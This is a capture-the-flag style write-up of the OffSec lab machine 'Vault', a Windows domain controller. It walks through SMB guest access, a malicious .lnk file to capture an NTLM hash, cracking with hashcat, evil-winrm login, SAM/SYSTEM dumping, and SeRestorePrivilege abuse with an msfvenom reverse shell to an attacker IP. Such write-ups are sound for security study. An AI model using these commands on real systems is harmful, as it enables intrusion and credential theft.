---
icon: windows
---

# Vault - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.172 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 06:46 EDT
Nmap scan report for 192.168.174.172
Host is up (0.031s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 10:48:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-29T10:49:41+00:00
|_ssl-date: 2025-09-29T10:50:20+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-09-28T10:45:37
|_Not valid after:  2026-03-30T10:45:37
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-time: 
|   date: 2025-09-29T10:49:41
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   29.72 ms 192.168.45.1
2   29.08 ms 192.168.45.254
3   29.76 ms 192.168.251.1
4   34.76 ms 192.168.174.172
```

ldap gives us a domain name vault.offsec. I'll add it to my /etc/hosts file.

```
192.168.174.172	vault.offsec
```

### <mark style="color:$primary;">SMB allows guest access</mark>

```
netexec smb 192.168.174.172 -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>

We have Read & Write access to the <mark style="color:$info;">**DocumentsShare**</mark>. Considering how there are not many other options, I am going to guess someone is checking the <mark style="color:$info;">**DocumentsShare**</mark> for updates. Therefore I am going to generate a malicious lnk file with [**ntlm\_theft.py**](https://github.com/Greenwolf/ntlm_theft) which will force ntlm authentication on Browsing the Folder.

### <mark style="color:$primary;">Capturing NTLM Creds with a malicious .lnk file</mark>

<figure><img src="../../.gitbook/assets/image (1145).png" alt=""><figcaption></figcaption></figure>

now before I place the file in the share I am going to setup impacket-smbserver to listen for incoming connections. You can also use `sudo responder -I tun0`

```
impacket-smbserver share . -smb2support
```

<figure><img src="../../.gitbook/assets/image (1146).png" alt=""><figcaption></figcaption></figure>

Now I can place the file

<figure><img src="../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

When a user accesses the <mark style="color:$info;">**DocumentsShare**</mark> directory, the user’s system will attempt to connect to our SMB server, leaking NTLM hash credential

<figure><img src="../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

We captured anirudh hash let's try to crack it.

### <mark style="color:$primary;">Cracking NTLM hash</mark>

<figure><img src="../../.gitbook/assets/image (1149).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 5600 -a 0 anirudh.hash /usr/share/wordlists/rockyou.txt --force
```

```
hashcat -m 5600 -a 0 anirudh.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

It worked, and with access to winrm I am going to use evil-winrm to get a shell on the machine

```
evil-winrm -i vault.offsec -u anirudh -p SecureHM
```

<figure><img src="../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

Anirudh has a lot of privilleges we can use to elevate ourselves to Administrator

### <mark style="color:$primary;">SeBackupPrivilege</mark>

Since we have SeBackupPrivilege lets copy the SAM and SYSTEM files to our machine

```
reg save hklm\sam sam
reg save hklm\system system
```

<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

```
impacket-secretsdump -system system -sam sam local
```

<figure><img src="../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

We got the local administrator hash! Now we can pass the hash and get a shell on the machine as administrator

<figure><img src="../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

All of my attempts of getting a shell on the machine as administrator have failed. RDP & WINRM both stall and do not allow access.

The local administrator acoount may be disabled?

<figure><img src="../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

Ahh I see the problem, only our current user anirudh can access the machine remotely.&#x20;

I am going to try and exploit SeRestorePrivilege

### <mark style="color:$primary;">SeRestorePrivilege</mark>

<figure><img src="../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>

In order to exploit this privilege we are going to need this [**executable**](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe) and we need to generate a malicious reverse shell that we will have SeRestoreAbuse.exe execute to give us a shell as Administrator

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135 -f exe -o reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>

Now that I have both files ready I will upload them&#x20;

<figure><img src="../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready, then execute:

```
.\SeRestoreAbuse.exe C:\Users\anirudh\Documents\reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1162).png" alt=""><figcaption></figcaption></figure>

And we got a shell as Administrator! I like how this machine baited me with SeBackupPrivilege :rofl: I knew it was to easy :joy:
